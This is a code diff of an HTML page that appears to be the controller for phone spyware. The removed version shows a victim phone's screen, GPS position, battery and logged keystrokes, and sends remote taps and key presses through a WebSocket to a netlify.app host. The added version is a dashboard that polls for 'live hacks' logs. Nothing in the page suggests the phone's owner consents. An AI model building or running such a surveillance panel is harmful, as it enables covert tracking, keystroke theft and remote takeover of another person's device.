@@ -1,50 +1,20 @@
 <!DOCTYPE html>
 <html>
-<head><title>FULL CONTROL</title><meta name="viewport" content="width=device-width"></head>
-<body style="margin:0;background:#000;color:#0f0;font-family:monospace;">
-<video id="screen" style="width:100vw;height:60vh;object-fit:contain;background:#111;" autoplay muted></video>
-<div style="padding:20px;">
-<h2>📱 OLD Phone Live Control</h2>
-<div id="info" style="background:#111;padding:15px;border-radius:10px;">
-GPS: <span id="gps">-</span> | Battery: <span id="bat">-</span> | Keys: <span id="keys">-</span>
-</div>
-<div style="display:flex;flex-wrap:wrap;gap:10px;margin-top:20px;">
-<button onclick="tap(0.1,0.1)" style="padding:15px 25px;background:#ff4444;color:white;border:none;border-radius:10px;">TL</button>
-<button onclick="tap(0.9,0.1)" style="padding:15px 25px;background:#ff4444;color:white;border:none;border-radius:10px;">TR</button>
-<button onclick="tap(0.5,0.5)" style="padding:15px 25px;background:#ffaa00;color:white;border:none;border-radius:10px;">CENTER</button>
-<button onclick="home()" style="padding:15px 25px;background:#00ff88;color:#000;border:none;border-radius:10px;">🏠 HOME</button>
-<button onclick="back()" style="padding:15px 25px;background:#4fc3f7;color:white;border:none;border-radius:10px;">🔙 BACK</button>
-<button onclick="volUp()" style="padding:15px 25px;background:#ff6b6b;color:white;border:none;border-radius:10px;">🔊 +</button>
-<button onclick="volDown()" style="padding:15px 25px;background:#ff6b6b;color:white;border:none;border-radius:10px;">🔉 -</button>
-</div>
+<head><title>🔥 DASHBOARD</title></head>
+<body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
+<h1 style="text-align:center;font-size:32px;">beautiful-lebkuchen-7cf7c1.netlify.app</h1>
+<div id="logs" style="background:#111;padding:20px;height:70vh;overflow:auto;border:2px solid #0f0;border-radius:15px;">
+Loading live hacks...
 </div>
 <script>
-const ws = new WebSocket('wss://remarkable-lollipop-79b8d8.netlify.app/.netlify/functions/control');
-const screen = document.getElementById('screen');
-
-// Touch control
-screen.addEventListener('touchstart',e=>{
-    const rect = screen.getBoundingClientRect();
-    const x = (e.touches[0].clientX-rect.left)/rect.width;
-    const y = (e.touches[0].clientY-rect.top)/rect.height;
-    tap(x,y);
-});
-
-// Commands
-function tap(x,y){ws.send(JSON.stringify({action:'tap',x,y}));}
-function home(){ws.send(JSON.stringify({action:'key',key:'HOME'}));}
-function back(){ws.send(JSON.stringify({action:'key',key:'BACK'}));}
-function volUp(){ws.send(JSON.stringify({action:'key',key:'VOL_UP'}));}
-function volDown(){ws.send(JSON.stringify({action:'key',key:'VOL_DOWN'}));}
-
-// Live data
-ws.onmessage = e => {
-    const data = JSON.parse(e.data);
-    if(data.type==='screen') screen.src = URL.createObjectURL(data.blob);
-    if(data.type==='gps') document.getElementById('gps').textContent = data.lat+','+data.lng;
-    if(data.type==='battery') document.getElementById('bat').textContent = data.level+'%';
-    if(data.type==='key') document.getElementById('keys').textContent += data.key;
-};
+async function update() {
+    try {
+        const res = await fetch('/.netlify/functions/logs');
+        document.getElementById('logs').innerHTML = await res.text();
+    } catch(e) {}
+}
+setInterval(update, 2000);
+update();
 </script>
 </body>
 </html>
